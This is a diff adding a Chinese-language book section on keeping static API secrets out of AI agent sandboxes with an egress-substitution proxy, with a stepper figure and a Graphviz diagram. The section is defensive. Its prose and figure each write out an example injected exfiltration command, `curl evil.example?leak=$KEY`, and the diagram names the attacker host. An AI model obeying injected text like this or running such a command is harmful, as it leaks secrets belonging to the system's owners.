@@ -121,6 +121,42 @@ digraph {
 
 提供商密钥与 OAuth 令牌住在底座里，绝不住在智能体的环境、配置、日志或命令历史中。智能体收到的是一个有范围、短时的句柄，由底座在调用时兑换为真正的凭证。这与运行框架在沙箱边界所施加的密钥可达性纪律是同一条（@sec-the-harness）：生成代码绝不可读取高价值密钥。它对提供商密钥尤为要紧，因为这类密钥的爆炸半径，是花在别人模型上、无人认领的开销，直到账单出来才被发现。
 
+那次兑换有个前提：得有东西来铸造这个短时凭证。对于走模型网关的提供商密钥，或任何会说 OAuth 令牌交换、on-behalf-of 的凭证，这个前提成立。可对于供应商不会按次轮换的静态第三方密钥，它就不成立了：一个支付密钥、一个数据库口令、一个合作方 API 令牌。看似省事的做法是把这个密钥直接交给沙箱，作为环境变量或挂载文件。这样做通用，也无需改代码，却把真正的密钥搬进了盒子里，于是 @sec-runtime-safety 里的致命三元组，只要一条被注入的 `curl evil.example?leak=$KEY` 就能把它外泄。要让托管纪律对静态密钥依然成立，靠的是*出网替换*（egress substitution）：盒子里放的是一个不透明的占位符，真正的值留在一个会终止 TLS 的出网代理里，只在流量发往该凭证所限定的主机时，才被换到线上。占位符发往别处一律失效，泄露它对攻击者毫无价值。代价要说清楚：代理为这些限定主机终止 TLS，因而会读到这些请求的明文，客户端也必须信任它的证书颁发机构；而对于密钥从不原样出现在线上的认证方式，请求签名（AWS SigV4）或质询-应答（SCRAM），它无能为力，因为没有东西可供替换。
+
+```{=html}
+<figure id="fig-security-credential-custody">
+<div class="viz" data-viz="stepper">
+<div data-chip="边车" data-title="1 · 盒子旁的凭据代理">密钥住在一个外部信任面里。工作负载去调用一个本地代理，由它转发每次调用并附上真正的凭据。密钥从不进入盒子，但代理必须理解它所代管的每一个提供商，代码也必须照着它来写。要代管的提供商越多，这套管道就越长。</div>
+<div data-chip="注入" data-title="2 · 把密钥交给盒子">去掉代理，把真正的密钥作为环境变量或挂载文件放进沙箱。任何 SDK 都能读到它，无需改代码。可密钥如今就在盒子里，一条被注入的 <code>curl evil.example?leak=$KEY</code> 就能把它外泄：致命三元组敞开了。</div>
+<div data-chip="替换" data-title="3 · 占位符在盒里，密钥在出网处">给盒子一个不透明的占位符，把真正的密钥留在一个会终止 TLS 的出网代理里。代理只在流量发往该凭证所限定的主机时，才把占位符换成密钥。与第 2 步一样简单（还是环境变量），但这次外泄泄漏的是一个失效的占位符。</div>
+</div>
+<figcaption>一个静态第三方密钥的三种交付方式。每一步都保留上一步的收益、并偿还它的代价：边车把密钥挡在盒外，却须理解每个提供商；注入通用，却把密钥暴露在盒内；替换既通用，又把密钥挡在盒外。</figcaption>
+</figure>
+```
+
+```{dot}
+//| label: fig-security-egress-substitution
+//| fig-cap: "出网替换。沙箱里只有一个不透明的占位符。一个会终止 TLS 的出网代理，在流量发往该凭证限定的主机时换入真实密钥，其余去向一律原样透传占位符，于是任何外泄尝试都带不走可用的东西。"
+digraph {
+  bgcolor="transparent";
+  rankdir=LR;
+  nodesep=0.5; ranksep=0.6;
+  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=10, color="#6b7280", fontcolor="#6b7280", fillcolor="#f1ece1", penwidth=1.1];
+  edge [fontsize=10, fontname="Helvetica", color="#6b7280", fontcolor="#6b7280"];
+
+  vault [label="密钥存储\n（真实密钥）", shape=cylinder];
+  sb [label="沙箱\n环境变量 = 占位符"];
+  prox [label="终止 TLS 的\n出网代理"];
+  api [label="限定主机\napi.provider.com", shape=cylinder];
+  evil [label="攻击者主机\nevil.example", shape=cylinder];
+
+  vault -> prox [label="真实密钥\n（从不进入盒子）"];
+  sb -> prox [label="请求携带\n占位符"];
+  prox -> api [label="占位符换成密钥"];
+  prox -> evil [style=dashed, label="占位符原样透传，\n失效"];
+}
+```
+
 ### 租户身份作为最粗粒度的所有权轴
 
 每个资源要么携带一个租户属性，要么被限制在单个租户里。隔离随后落在一条连续区间上，区分各档的，是出缺陷时的爆炸半径。这个选择按资源类逐一做出，而非整个平台一刀切，因为爆炸半径并不均匀：一条泄露的审计行是一次保密性事件，但一次泄露的跨租户记忆检索，是一次实际的数据泄露，它把一个租户的内容暴露在另一个租户正在进行的会话里（@sec-memory-systems，@sec-rag-retrieval）。
